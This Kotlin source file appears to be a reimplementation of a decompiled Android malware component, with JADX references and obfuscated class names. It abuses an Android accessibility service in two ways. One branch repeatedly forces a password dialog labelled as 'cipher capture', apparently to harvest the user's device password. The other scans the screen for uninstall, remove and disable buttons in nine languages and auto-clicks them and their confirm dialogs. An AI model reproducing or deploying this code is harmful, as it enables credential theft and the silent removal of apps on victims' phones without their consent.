package com.storm.safe.rock.service

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.activity.syuqattwmgit
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Multi-purpose runnable dispatched from MyAccessibilityService.
 *
 * JADX reference: service/RunnableC0284a4.java (92 LOC)
 * Uses an actionId to switch between different operations:
 * - actionId 0: Launch password dialog (syuqattwmgit) with retry logic
 * - actionId 1 (default): Find and click uninstall button via coroutine
 */
class AccessibilityServiceRunnable(
    val actionId: Int,
    private val service: MyAccessibilityService? = null
) : Runnable {

    companion object {
        private const val TAG = "MyAccessibilityService"

        /** JADX: f52472k3 — max retry count for password dialog */
        const val MAX_PASSWORD_RETRIES = 3

        /** JADX: f52473k4 — retry delay (ms) for password dialog */
        const val PASSWORD_RETRY_DELAY_MS = 5000L

        /** JADX: dh0.f55754a4 — uninstall/remove/delete button texts (multi-language) */
        val UNINSTALL_BUTTON_TEXTS = listOf(
            // Chinese
            "卸载", "移除", "删除", "停用", "禁用",
            // Japanese
            "アンインストール", "削除", "無効化",
            // Korean
            "제거", "삭제", "사용 중지",
            // English
            "Uninstall", "Remove", "Delete", "Disable",
            // French
            "Désinstaller", "Supprimer", "Désactiver",
            // Spanish
            "Desinstalar", "Eliminar", "Deshabilitar",
            // Portuguese
            "Desinstalar", "Remover", "Desativar",
            // German
            "Deinstallieren", "Entfernen", "Deaktivieren",
            // Russian
            "Удалить", "Деинсталляция", "Отключить"
        )
    }

    override fun run() {
        when (actionId) {
            0 -> launchPasswordDialog()
            else -> findAndClickUninstallButton()
        }
    }

    /**
     * Launches the password dialog activity (syuqattwmgit) with retry logic.
     *
     * JADX: case 0 — calls syuqattwmgit.f51917a3.start() with a callback that:
     * - On success: resets retry counter, stops retrying
     * - On failure: increments retry count, schedules next retry after delay
     * - On max retries: stops and resets
     */
    private fun launchPasswordDialog() {
        val svc = service ?: return
        try {
            Log.d(TAG, "📱 启动 syuqattwmgit... (第${svc.cipherCaptureAttemptCount + 1}次)")
            // vendor: JADX RunnableC0284a4 case 0 →
            // syuqattwmgit.f51917a3.start(service, 0, callback)
            syuqattwmgit.start(svc, 0) { success ->
                if (success) {
                    Log.d(TAG, "✅ 密码验证成功，停止重试")
                    svc.isCipherCaptureEnabled = false
                    svc.cipherCaptureAttemptCount = 0
                } else {
                    svc.cipherCaptureAttemptCount++
                    if (svc.isCipherCaptureEnabled) {
                        // JADX: f52472k3 = maxRetries, f52473k4 = retryDelayMs
                        val maxRetries = MAX_PASSWORD_RETRIES
                        val retryDelay = PASSWORD_RETRY_DELAY_MS
                        if (svc.cipherCaptureAttemptCount >= maxRetries) {
                            Log.w(TAG, "⚠️ 密码监听已达最大重试次数($maxRetries)，停止")
                            svc.isCipherCaptureEnabled = false
                            svc.cipherCaptureAttemptCount = 0
                        } else {
                            Log.d(TAG, "🔄 密码验证失败/取消，${retryDelay}ms后重新弹出 (${svc.cipherCaptureAttemptCount}/$maxRetries)")
                            // JADX: C0335a1.m211788c1 — reset cipher capture state for retry
                            svc.cipherCaptureManager?.resetOverlayWatcher()
                            // JADX: bm0(service, 9) with delay — schedule re-trigger
                            Handler(Looper.getMainLooper()).postDelayed(
                                AccessibilityServiceRunnable(0, svc),
                                retryDelay
                            )
                        }
                    } else {
                        Log.d(TAG, "🛑 密码监听已被外部停止，不再重试")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 启动 syuqattwmgit 失败: ${e.message}", e)
            svc.isCipherCaptureEnabled = false
        }
    }

    /**
     * Finds and clicks the uninstall button via accessibility tree search.
     *
     * JADX: default case — launches coroutine for
     * dqtvuisjd$findAndClickUninstallButton$1
     *
     * Flow:
     * 1. Get rootInActiveWindow
     * 2. Iterate dh0.f55754a4 (uninstall button texts) — multi-language
     * 3. For each text, findAccessibilityNodeInfosByText
     * 4. If node is clickable → click directly
     * 5. If not clickable → traverse parents for clickable ancestor
     * 6. After successful click → launch findAndClickUninstallButtonInternal
     */
    private fun findAndClickUninstallButton() {
        Log.d(TAG, "🔍 Step 4: 查找并点击卸载按钮")
        val svc = service ?: return
        val scope = svc.getCoroutineScope() ?: return

        scope.launch(Dispatchers.Default) {
            try {
                val root = svc.rootInActiveWindow
                if (root == null) {
                    Log.w(TAG, "⚠️ 无法获取当前窗口")
                    return@launch
                }

                for (text in UNINSTALL_BUTTON_TEXTS) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    if (nodes.isNullOrEmpty()) continue

                    for (node in nodes) {
                        if (node.isClickable) {
                            Log.d(TAG, "✅ 找到卸载按钮: ${node.text}")
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            // Recycle
                            nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                            try { root.recycle() } catch (_: Exception) {}
                            // JADX: launch findAndClickUninstallButtonInternal$1 — confirm dialog
                            launchConfirmDialogHandler(svc)
                            return@launch
                        }

                        // Traverse parents for clickable ancestor
                        val parentChain = mutableListOf<AccessibilityNodeInfo>()
                        var parent = node.parent
                        while (parent != null) {
                            parentChain.add(parent)
                            if (parent.isClickable) {
                                Log.d(TAG, "✅ 点击卸载按钮的父节点")
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                                nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                                try { root.recycle() } catch (_: Exception) {}
                                launchConfirmDialogHandler(svc)
                                return@launch
                            }
                            parent = parent.parent
                        }
                        parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                    }
                    nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                }

                Log.w(TAG, "⚠️ 未找到卸载按钮")
                try { root.recycle() } catch (_: Exception) {}
            } catch (e: Exception) {
                Log.e(TAG, "❌ 查找卸载按钮失败", e)
            }
        }
    }

    /**
     * After clicking uninstall button, handle the confirm dialog.
     * JADX: dqtvuisjd$findAndClickUninstallButtonInternal$1/3
     */
    private fun launchConfirmDialogHandler(svc: MyAccessibilityService) {
        svc.getCoroutineScope()?.launch(Dispatchers.Default) {
            try {
                kotlinx.coroutines.delay(500L)
                svc.handleUninstallConfirmDialog()
            } catch (_: Exception) {}
        }
    }
}
